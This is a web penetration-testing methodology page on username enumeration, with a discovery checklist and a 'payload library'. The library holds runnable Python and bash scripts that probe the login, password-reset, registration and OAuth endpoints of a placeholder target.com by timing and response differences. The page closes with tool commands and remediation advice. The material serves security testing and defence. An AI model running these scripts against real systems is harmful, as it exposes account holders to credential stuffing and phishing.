---
title: "Username Enumeration"
date: 2026-02-24
draft: false
---

# Username Enumeration

> **Severity**: Medium | **CWE**: CWE-204, CWE-203
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is Username Enumeration?

Username enumeration allows an attacker to determine which usernames (email addresses, account identifiers) are registered in a system. Even without a password, a validated target list dramatically improves credential stuffing, targeted phishing, and brute force efficiency.

Enumeration channels:
1. **Differential HTTP responses**: different status code, body text, or length for valid vs invalid usernames
2. **Timing differences**: valid usernames trigger more computation (password hash comparison) → measurable delay
3. **Indirect channels**: password reset, registration, OAuth errors, email verification, API error bodies, profile URLs

```
Indicator comparison:
  Invalid user:  HTTP 200, body: "Invalid credentials"        (13ms)
  Valid user:    HTTP 200, body: "Invalid credentials"        (87ms) ← timing leak
  → identical visible response, but 74ms difference → valid user does bcrypt compare
```

---

## Discovery Checklist

**Phase 1 — Login Endpoint**
- [ ] Test with known valid username vs random invalid username — compare response body, length, headers
- [ ] Measure response time (≥10 requests each, average) — does valid username add latency?
- [ ] Compare HTTP status codes: 200 vs 401 vs 403 vs 302
- [ ] Check `WWW-Authenticate` header differences
- [ ] Look for field-level error messages: "Password incorrect" vs "User not found"
- [ ] Check JSON error codes in API responses: `{"code": "INVALID_PASSWORD"}` vs `{"code": "USER_NOT_FOUND"}`

**Phase 2 — Other Enumeration Channels**
- [ ] Password reset: "Reset email sent" vs "Email not found" — or always same message but timing differs
- [ ] Registration: "Username taken" vs "Username available"
- [ ] OAuth "Login with Google" — try linking an email that is/isn't registered
- [ ] Profile pages: `/users/username` → 200 vs 404
- [ ] API: `GET /api/users/username` → 200/403 (exists) vs 404 (not found)
- [ ] Email verification resend: valid email gets email, invalid gets different response
- [ ] "Forgot username" feature — enter email, observe response difference

**Phase 3 — Indirect / Blind Enumeration**
- [ ] Registration CAPTCHA: only shown for existing usernames (some systems pre-validate)
- [ ] Login redirect timing: valid user redirected to dashboard, invalid redirected to login
- [ ] Account lockout: after N attempts, valid account locks → error message changes
- [ ] CSS/JS loaded on login fail for valid user (2FA prompt CSS preloaded)

---

## Payload Library

### Payload 1 — Response Differential Detection

```python
#!/usr/bin/env python3
"""
Username enumeration via response comparison
Identify differences in: status code, body length, body content, response time
"""
import requests, time, statistics, json

TARGET = "https://target.com/api/auth/login"
HEADERS = {"Content-Type": "application/json"}
KNOWN_VALID = "admin@target.com"  # or any email you know is valid (your own account)

def probe_login(username, iterations=5):
    """Test login with wrong password, measure response"""
    times = []
    last_response = None
    for _ in range(iterations):
        start = time.monotonic()
        r = requests.post(TARGET, headers=HEADERS,
                          json={"username": username, "password": "INVALID_PASS_XYZ123!"},
                          timeout=30)
        elapsed = (time.monotonic() - start) * 1000
        times.append(elapsed)
        last_response = r
    return {
        "username": username,
        "status": last_response.status_code,
        "body_len": len(last_response.text),
        "body_preview": last_response.text[:200],
        "avg_ms": statistics.mean(times),
        "stdev_ms": statistics.stdev(times) if len(times) > 1 else 0,
    }

# Baseline with known valid and invalid:
print("[*] Profiling known valid user...")
valid_profile = probe_login(KNOWN_VALID)
print(f"    Valid: {valid_profile['avg_ms']:.1f}ms avg, len={valid_profile['body_len']}")
print(f"    Body: {valid_profile['body_preview'][:100]}")

print("[*] Profiling known invalid user...")
invalid_profile = probe_login("definitely_not_registered_xyz123@invalid.tld")
print(f"    Invalid: {invalid_profile['avg_ms']:.1f}ms avg, len={invalid_profile['body_len']}")
print(f"    Body: {invalid_profile['body_preview'][:100]}")

timing_diff = valid_profile['avg_ms'] - invalid_profile['avg_ms']
body_diff = valid_profile['body_len'] - invalid_profile['body_len']

print(f"\n[*] Timing difference: {timing_diff:.1f}ms")
print(f"[*] Body length difference: {body_diff} chars")

# Enumerate a list of usernames:
CANDIDATES = ["admin", "administrator", "root", "user", "test", "support", "info"]

print("\n[*] Enumerating username list...")
for username in CANDIDATES:
    probe = probe_login(username + "@target.com", iterations=3)
    # Classify based on baseline:
    timing_match = abs(probe['avg_ms'] - valid_profile['avg_ms']) < abs(probe['avg_ms'] - invalid_profile['avg_ms'])
    body_match = abs(probe['body_len'] - valid_profile['body_len']) < abs(probe['body_len'] - invalid_profile['body_len'])
    verdict = "LIKELY EXISTS" if (timing_match or body_match) else "likely not found"
    print(f"  {username}: {probe['avg_ms']:.0f}ms, len={probe['body_len']} → {verdict}")
```

### Payload 2 — Password Reset Enumeration

```python
#!/usr/bin/env python3
"""
Enumerate via password reset endpoint
Even when response says "If this email exists, we'll send a reset link"
— timing still leaks
"""
import requests, time, statistics

TARGET = "https://target.com/api/password/reset"
HEADERS = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

def probe_reset(email, iterations=5):
    times = []
    for _ in range(iterations):
        start = time.monotonic()
        r = requests.post(TARGET, headers=HEADERS,
                          json={"email": email}, timeout=30)
        elapsed = (time.monotonic() - start) * 1000
        times.append(elapsed)
    return {
        "email": email,
        "avg_ms": statistics.mean(times),
        "status": r.status_code,
        "body": r.text[:300],
    }

# Common corporate email formats to enumerate:
company = "target.com"
usernames = [
    "admin", "administrator", "ceo", "cto", "cfo",
    "it", "security", "devops", "engineering",
    "support", "helpdesk", "info", "contact",
    "sales", "marketing", "hr", "finance",
    "noreply", "no-reply", "webmaster", "postmaster",
    "root", "test", "staging", "dev",
]

# Also try from LinkedIn, Hunter.io, or breach data:
known_format_emails = [
    f"j.smith@{company}", f"john.smith@{company}",
    f"jsmith@{company}", f"johnsmith@{company}",
    f"john_smith@{company}", f"smith.john@{company}",
]

results = []
for email in [f"{u}@{company}" for u in usernames] + known_format_emails:
    profile = probe_reset(email, iterations=3)
    results.append(profile)
    print(f"{email}: {profile['avg_ms']:.0f}ms | {profile['status']}")

# Find outliers (significantly slower = user exists → bcrypt/scrypt hash computed):
times = [r['avg_ms'] for r in results]
mean_t = statistics.mean(times)
stdev_t = statistics.stdev(times)

print(f"\n[*] Mean: {mean_t:.0f}ms, Stdev: {stdev_t:.0f}ms")
print("[*] Likely valid accounts (>1.5 stdev above mean):")
for r in results:
    if r['avg_ms'] > mean_t + 1.5 * stdev_t:
        print(f"  [!!!] {r['email']}: {r['avg_ms']:.0f}ms")
```

### Payload 3 — Registration Endpoint Enumeration

```bash
# Test registration endpoint for existing username detection:
# Response differs: "Username already taken" vs successful registration

# Burp Intruder payload — try common usernames:
POST /api/register HTTP/1.1
Content-Type: application/json

{"username": "§admin§", "email": "§admin§@target.com", "password": "TestPass123!"}

# Compare responses:
# 409 Conflict or "Email already in use" → user EXISTS
# 200/201 Created → user does NOT exist

# Batch test with curl:
for username in admin administrator root test support info webmaster; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${username}@target.com\",\"password\":\"TestPass123!\",\"username\":\"${username}\"}")
  echo "$username → HTTP $response"
  sleep 0.5
done

# Profile/user endpoint enumeration (IDOR check):
# GET /users/USERNAME → 200 (found) vs 404 (not found)
for username in admin john.smith alice bob.jones; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/users/$username")
  echo "$username → $status"
done

# API endpoint: GET /api/users/check?email=X
curl "https://target.com/api/users/check?email=admin@target.com"
curl "https://target.com/api/users/availability?username=admin"
# → {"available": false} = user exists
```

### Payload 4 — OAuth / SSO Enumeration

```bash
# OAuth provider "Login with Google/GitHub" — try linking an email:
# If account with that email exists → "Account already linked" or redirect to login
# If not → new account created or "no account found"

# Test Google OAuth flow with known/unknown emails:
# 1. Start OAuth flow → get state token
# 2. In callback, provide email via token manipulation

# Azure AD / OIDC UserInfo endpoint enumeration:
# Some identity providers return different errors for unknown vs locked accounts
curl -X POST "https://login.microsoftonline.com/TENANT/oauth2/token" \
  -d "grant_type=password&client_id=CLIENT_ID&username=test@target.com&password=WRONG"
# Error: AADSTS50034 → user not found in directory
# Error: AADSTS50126 → user found, invalid password
# Error: AADSTS50053 → user found, account locked
# Error: AADSTS50057 → user found, account disabled

# GitHub-style: /users/USERNAME API (public, no auth needed):
curl "https://target.com/api/v1/users/CANDIDATE_USERNAME"
# 200 = exists, 404 = not found

# Subdomain enumeration for email format discovery:
# Before enumerating → discover email format:
# Check LinkedIn, Hunter.io, company website for exposed email patterns
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY"
```

### Payload 5 — Timing Attack Measurement

```python
#!/usr/bin/env python3
"""
Statistical timing-based username enumeration
Accounts for network jitter with median filtering and statistical outlier detection
"""
import requests, time, statistics, json, sys
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://target.com/api/login"

def measure_login_time(username, n=15):
    """Measure n login attempts and return statistical measures"""
    times = []
    for _ in range(n):
        payload = json.dumps({"username": username, "password": "P@ssw0rd_INVALID_XYZ"})
        t0 = time.monotonic()
        try:
            requests.post(TARGET,
                         headers={"Content-Type": "application/json"},
                         data=payload, timeout=15)
        except: pass
        times.append((time.monotonic() - t0) * 1000)

    times.sort()
    # Remove top/bottom 10% as outliers (network jitter):
    trim = max(1, len(times) // 10)
    trimmed = times[trim:-trim] if len(times) > 2*trim else times
    return {
        "username": username,
        "median": statistics.median(trimmed),
        "mean": statistics.mean(trimmed),
        "stdev": statistics.stdev(trimmed) if len(trimmed) > 1 else 0,
        "min": min(trimmed),
        "max": max(trimmed),
    }

# Step 1: Calibrate with known users
print("[*] Calibrating...")
baseline_valid = measure_login_time("YOUR_OWN_ACCOUNT@target.com")
baseline_invalid = measure_login_time("zzz_definitely_not_real_xyz789@invalid.example")

print(f"Valid baseline:   median={baseline_valid['median']:.1f}ms ±{baseline_valid['stdev']:.1f}")
print(f"Invalid baseline: median={baseline_invalid['median']:.1f}ms ±{baseline_invalid['stdev']:.1f}")

threshold = baseline_valid['median'] * 0.75  # 75% of valid user time

# Step 2: Enumerate
candidates = [line.strip() for line in open('email_wordlist.txt') if line.strip()]

print(f"\n[*] Enumerating {len(candidates)} candidates (threshold: {threshold:.0f}ms)...")
found = []

for username in candidates:
    result = measure_login_time(username, n=7)  # fewer iterations for speed
    indicator = "✓ VALID" if result['median'] > threshold else "✗ invalid"
    print(f"  {username}: {result['median']:.0f}ms {indicator}")
    if result['median'] > threshold:
        found.append(username)

print(f"\n[+] Likely valid accounts: {found}")
```

### Payload 6 — Side-Channel via Error Messages

```bash
# Collect error messages systematically — look for field-specific differences:

# Test login with various scenarios:
scenarios=(
  '{"username":"valid@target.com","password":"WrongPassword1!"}'
  '{"username":"invalid_xyz@notreal.com","password":"WrongPassword1!"}'
  '{"username":"valid@target.com","password":""}'
  '{"username":"invalid@notreal.com","password":""}'
  '{"username":"valid@target.com","password":"a"}'
  '{"username":"VALID@TARGET.COM","password":"wrong"}'  # case sensitivity test
)

for payload in "${scenarios[@]}"; do
  echo "Payload: $payload"
  curl -s -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d "$payload" | python3 -m json.tool 2>/dev/null || echo "(non-JSON response)"
  echo "---"
done

# Look for these differentiating signals in responses:
# - Different "code" fields: USER_NOT_FOUND vs INVALID_PASSWORD vs ACCOUNT_LOCKED
# - Different HTTP status: 401 (auth failed) vs 404 (user not found) vs 403 (disabled)
# - Different "message" wording: "Invalid credentials" vs "Account not found"
# - Different response headers: Set-Cookie (session started = user found)
# - Different redirect targets: /login/2fa (user valid, 2FA required)
# - Different JSON schema: error has "attempts_remaining" field only for valid users

# Multi-channel enumeration: combine endpoints for higher confidence
python3 << 'EOF'
import requests

target = "target.com"
email = "test@target.com"

endpoints = {
    "login": f"https://{target}/api/login",
    "reset": f"https://{target}/api/password/reset",
    "register": f"https://{target}/api/register",
    "check": f"https://{target}/api/users/exists",
}

payloads = {
    "login": {"username": email, "password": "WRONG"},
    "reset": {"email": email},
    "register": {"email": email, "username": "test", "password": "Test123!"},
    "check": {"email": email},
}

for name, url in endpoints.items():
    try:
        r = requests.post(url, json=payloads[name], timeout=5)
        print(f"{name}: HTTP {r.status_code} | {r.text[:150]}")
    except Exception as e:
        print(f"{name}: {e}")
EOF
```

---

## Tools

```bash
# ffuf — fast username enumeration:
ffuf -u https://target.com/api/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"FUZZ@target.com","password":"invalidpassword"}' \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -mc 200 -fs BASELINE_SIZE  # filter by body size change

# Usernames wordlists (SecLists):
# /usr/share/seclists/Usernames/Names/names.txt
# /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# /usr/share/seclists/Usernames/xato-net-10-million-usernames-ug.txt

# For email-based targets — generate corporate email variants:
company="target.com"
name="john smith"
python3 -c "
name = 'john smith'
parts = name.split()
f, l = parts[0], parts[1]
domain = 'target.com'
formats = [
    f'{f}@{domain}',f'{l}@{domain}',
    f'{f}.{l}@{domain}',f'{f[0]}.{l}@{domain}',
    f'{f[0]}{l}@{domain}',f'{f}{l[0]}@{domain}',
    f'{l}.{f}@{domain}',f'{f}_{l}@{domain}',
]
print('\n'.join(formats))
"

# Burp Suite Intruder:
# Attack type: Sniper on username field
# Payload: email wordlist or username wordlist
# Grep match: response body/length differences
# Track: response time column (enable in columns)

# Timing-based enumeration with turbo intruder:
# (Python script in Turbo Intruder BApp)
# Set iterations=20 per username, use median timing

# Hunter.io — discover real email addresses:
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(e['value']) for e in d['data']['emails']]"

# IntelliX / PhoneBook.cz — email enumeration from breaches:
# OSINT sources for email discovery before brute-forcing
```

---

## Remediation Reference

- **Generic error messages**: always return the exact same message for invalid username and invalid password — "Invalid credentials" with no field-level distinction
- **Constant-time response**: use `hash_equals()` in PHP, `hmac.compare_digest()` in Python — always hash a dummy password even when the user doesn't exist to normalize response time
- **Same status code**: return HTTP 200 (or always 401) regardless of whether user exists or not — never return 404 for missing user at login endpoint
- **Rate limiting + CAPTCHA**: on login, password reset, and registration — prevent automated enumeration
- **Password reset response**: always say "If your email is registered, you'll receive a reset link" — don't differentiate
- **Registration**: consider allowing registration regardless and merge accounts via email verification, or use CAPTCHA to slow enumeration
- **Subdomain/profile pages**: return 404 for non-existent users or implement authorization checks that return 403 for all (not 404 for missing, 403 for unauthorized)

*Part of the Web Application Penetration Testing Methodology series.*
